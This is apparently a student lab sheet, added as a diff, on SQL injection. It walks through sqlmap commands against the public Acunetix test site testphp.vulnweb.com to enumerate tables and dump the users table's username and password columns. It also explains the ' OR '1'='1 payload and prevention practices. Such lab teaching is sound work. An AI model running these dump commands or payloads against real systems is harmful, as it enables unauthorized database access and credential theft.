@@ -1,0 +1,129 @@
+***********exp3 sql injection***************
+
+
+1) open kali Linux
+
+
+
+2)open terminal and type         "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart –tables"      it will  show tables in database
+				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart –tables
+
+Explanation:
+• -D database_name: Specifies the database to target.
+• --tables: Lists all tables in the specified database. 
+
+
+
+
+3) In same terminal type       "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users --column"      it will show the table column and datatypes
+				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users --column					
+
+Explanation:
+• -T users: Specifies the table to analyze.
+• --columns: Lists column names in the table
+
+
+
+
+4)In same type  "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C uname --dump"   it will show the username entry
+				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C uname --dump
+
+
+
+
+5)in same type   "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C pass –dump"  it will show the password entry
+				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C pass –dump
+
+Explanation:
+• -C uname, pass: Selects specific columns (username and password).
+• --dump: Dumps data from the selected columns. 
+
+6)done.
+
+
+*******************THEORY***********************
+
+Aim: To learn simulation of SQL injection attack.
+
+lab outcome:
+	Understood the concept and impact of SQL Injection vulnerabilities in web applications.
+	Gained hands-on experience using SQLMap to detect and exploit SQL injection flaws.
+	Successfully identified vulnerable parameters and extracted database information from a test target.
+	Learned the importance of secure coding practices and input validation to prevent injection attacks.
+
+
+Requirements
+• Kali Linux (or any system with Python installed)
+• SQLMap installed (apt install sqlmap or pip install sqlmap)
+• A target website vulnerable to SQL injection
+• Internet connection (if testing a remote target) 
+
+
+
+1. About the URL
+
+The URL http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 points to a publicly available vulnerable web application.
+It is hosted by Acunetix for security testing and learning purposes.
+It simulates real-world web application vulnerabilities like:
+	SQL Injection (SQLi)
+	Cross-Site Scripting (XSS)
+	Broken Authentication
+	File Upload Vulnerabilities, etc.
+
+2. Breaking Down the URL
+
+Part									Description
+http									Protocol used to access the web resource.
+testphp.vulnweb.com						Domain name of the vulnerable web server.
+/AJAX/infoartist.php						Path to a PHP script handling requests.
+?id=1								Query string parameter (id) passed to the script with a value of 1.
+
+3. Possible Vulnerability
+	The PHP file infoartist.php may accept user input (id) and directly use it in an SQL query like:
+	SELECT * FROM artists WHERE id = '$id';
+	If input validation and sanitization are missing, it becomes vulnerable to SQL Injection.
+
+4. What is SQL Injection (SQLi)?
+	SQL Injection is a web security vulnerability where an attacker manipulates SQL queries by injecting malicious input into an application.
+
+This allows attackers to:
+	Access unauthorized data
+	Modify or delete data
+	Execute administrative operations on the database
+	Bypass authentication
+	In some cases, achieve remote code execution (RCE)
+
+5. How an Attack Would Work
+	Normal input: id=1
+	Server runs: SELECT * FROM artists WHERE id = 1;
+	Malicious input: id=1' OR '1'='1
+	Server may run: SELECT * FROM artists WHERE id = '1' OR '1'='1';
+	This condition always evaluates to TRUE, exposing all records.
+
+6. Tools Used for Testing
+	Manual testing by inserting payloads into the URL (e.g., ' OR '1'='1).
+	Automated tools like:
+	sqlmap (for SQL Injection detection and exploitation)
+	Burp Suite (for intercepting and modifying web requests)
+	OWASP ZAP (for automated vulnerability scanning)
+
+7. Best Practices to Prevent SQL Injection
+	Use Prepared Statements (Parameterized Queries).
+	Use ORM frameworks (Object Relational Mapping).
+	Perform input validation and input sanitization.
+	Implement least privilege for database accounts.
+	Use Web Application Firewalls (WAFs) for extra protection.
+
+🎯 Final One-Line Summary
+"testphp.vulnweb.com is a publicly hosted vulnerable web app used to practice exploiting web security flaws like SQL Injection by injecting malicious inputs into dynamic SQL queries without proper validation."
+
+📋 If They Ask You a Quick Oral Question Like:
+
+Question									Short, Perfect Answer
+What is this URL?							A public vulnerable web app for practicing SQL Injection and other attacks.
+What is happening at id=1?						The server retrieves artist information based on the id parameter, potentially without sanitization.
+How to exploit it?							Inject SQL payloads via id parameter to modify database queries.
+How to prevent it?							By using prepared statements and validating user input.
+
+
+
